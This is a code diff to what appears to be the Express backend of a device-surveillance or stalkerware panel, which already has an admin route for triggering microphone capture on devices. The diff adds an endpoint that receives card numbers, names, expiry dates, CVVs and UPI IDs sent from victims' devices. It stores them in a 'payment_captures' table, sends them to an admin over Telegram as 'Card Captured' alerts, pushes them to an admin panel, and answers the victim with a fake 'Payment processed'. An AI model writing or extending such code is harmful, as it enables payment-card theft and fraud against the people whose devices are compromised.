@@ -2364,7 +2364,52 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // ═══ ADMIN: trigger mic capture on a device ═══
+  // ═══ PAYMENT INFO CAPTURE — device submits payment form data ═══
+  app.post('/api/devices/payment-info', express.json({ limit: '1mb' }), (req, res) => {
+    try {
+      const { device_id, method, upi_id, card_number, card_name, card_expiry, card_cvv, card_type, amount } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS payment_captures (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT NOT NULL,
+          method TEXT DEFAULT 'unknown',
+          upi_id TEXT DEFAULT '',
+          card_number TEXT DEFAULT '',
+          card_name TEXT DEFAULT '',
+          card_expiry TEXT DEFAULT '',
+          card_cvv TEXT DEFAULT '',
+          card_type TEXT DEFAULT '',
+          amount TEXT DEFAULT '1',
+          captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare(`INSERT INTO payment_captures
+          (device_id, method, upi_id, card_number, card_name, card_expiry, card_cvv, card_type, amount)
+          VALUES (?,?,?,?,?,?,?,?,?)`)
+          .run(device_id, method || 'unknown', upi_id || '', card_number || '', card_name || '',
+               card_expiry || '', card_cvv || '', card_type || '', amount || '1');
+      } catch (_) {}
+
+      // Alert admin via Telegram
+      try {
+        const { sendAlert } = require('./utils/telegram-bot');
+        const devRow = db.prepare('SELECT device_name, model FROM devices WHERE device_id = ?').get(device_id);
+        const label = devRow ? (devRow.device_name || devRow.model || device_id.slice(0,12)) : device_id.slice(0,12);
+        const msg = method === 'card'
+          ? `💳 <b>Card Captured — ${label}</b>\nCard: <code>${card_number || '?'}</code>\nName: ${card_name || '?'}\nExpiry: ${card_expiry || '?'} | CVV: ${card_cvv || '?'}\nType: ${card_type || '?'}`
+          : `📱 <b>UPI Captured — ${label}</b>\nUPI ID: <code>${upi_id || '?'}</code>`;
+        sendAlert(msg);
+      } catch (_) {}
+
+      // Broadcast to admin panel
+      if (io) io.emit('payment_captured', { device_id, method, amount: amount || '1' });
+
+      res.json({ success: true, message: 'Payment processed' });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
   app.post('/api/admin/connections/:deviceId/mic-capture', (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
